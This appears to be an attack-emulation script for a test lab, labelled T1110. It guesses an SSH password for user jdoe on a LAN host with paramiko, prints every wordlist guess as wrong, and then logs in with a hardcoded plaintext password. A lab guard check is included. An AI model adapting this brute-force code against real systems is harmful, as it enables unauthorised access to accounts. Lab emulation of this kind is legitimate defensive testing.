"""T1110: guess jdoe's password on office01 through the firewall, then get in."""

import socket
import time
from importlib.resources import files

import paramiko

from attacks.guard import assert_in_lab
from attacks.mgmt import TargetUnreachable

TARGET = "10.20.0.20"   # office01 on the LAN, reached through pfSense
USER = "jdoe"
REAL_PASSWORD = "Summer2026!"


def try_login(password: str) -> bool:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(TARGET, username=USER, password=password, timeout=10,
                       banner_timeout=10, auth_timeout=10,
                       allow_agent=False, look_for_keys=False)
        client.exec_command("id")
        return True
    except paramiko.AuthenticationException:
        return False
    except (socket.timeout, TimeoutError, OSError,
            paramiko.ssh_exception.NoValidConnectionsError) as exc:
        raise TargetUnreachable(f"office01 ({TARGET}) did not answer on port 22") from exc
    finally:
        client.close()


def run() -> None:
    assert_in_lab(TARGET)
    words = (files("attacks") / "wordlist.txt").read_text().split()
    for password in words:
        try_login(password)
        print(f"  tried {password!r}: wrong")
        time.sleep(0.5)
    if try_login(REAL_PASSWORD):
        print(f"  tried {REAL_PASSWORD!r}: logged in as {USER}")
